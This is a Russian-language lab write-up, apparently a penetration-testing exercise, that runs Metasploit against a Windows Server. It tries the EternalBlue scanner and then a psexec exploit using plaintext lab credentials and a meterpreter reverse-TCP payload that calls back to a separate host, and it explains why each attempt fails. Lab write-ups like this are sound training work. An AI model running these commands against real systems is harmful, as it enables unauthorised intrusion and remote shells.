### Поиск и запуск эксплойта

Поскольку имеется связь с Windows Server через WinRM (5985/tcp), можно использовать брутфорс учётных данных или проверить наличие уязвимости MS17-010 EternalBlue.

Для брутфорса SSH (если SSH-сервер не включён на Windows Server, можно использовать WinRM-брутфорс). Но для демонстрации выполним проверку на EternalBlue:

```bash
search eternalblue
```
<img width="1239" height="637" alt="{3F17EB63-D996-4EE4-B204-521F23184656}" src="https://github.com/user-attachments/assets/8834d0f3-9de8-4974-9ae1-322d92d1ab35" />

```bash
use auxiliary/scanner/smb/smb_ms17_010
```
```bash
set RHOSTS 192.168.211.10
```
```bash
run
```

**Анализ результата:**

<img width="741" height="98" alt="{415D2586-11C7-493A-AA10-E3BEDBE5D361}" src="https://github.com/user-attachments/assets/be80a481-d14f-4d20-b277-35ee68f342f9" />

- SMB signing required (обязательная подпись SMB) – сервер требует подписи, а Metasploit по умолчанию не подписывает пакеты.
- Анонимный доступ к IPC$ запрещён политикой безопасности (это нормально для современного Windows Server).

Таким образом, сканер smb_ms17_010 не может проверить уязвимость, так как ему нужен хотя бы минимальный анонимный доступ к IPC$.

## Эксплуатация через psexec с учётными данными

```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.211.10
set SMBUser ansible
set SMBPass Pass123!
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.207.10
set LPORT 4444
run
```

**Анализ результата:**

<img width="717" height="160" alt="{1445B5C0-D112-4839-B129-28AFF84C0853}" src="https://github.com/user-attachments/assets/c5648da4-ae5d-4db8-b515-e408e4ffd599" />

Пользователь ansible (даже с флагом admincount: true) не имеет права создавать и запускать службу на целевой системе. Для psexec требуются права локального администратора на целевой машине. Скорее всего, ansible либо не входит в группу Administrators на Windows Server, либо политика ограничивает удалённое создание служб.
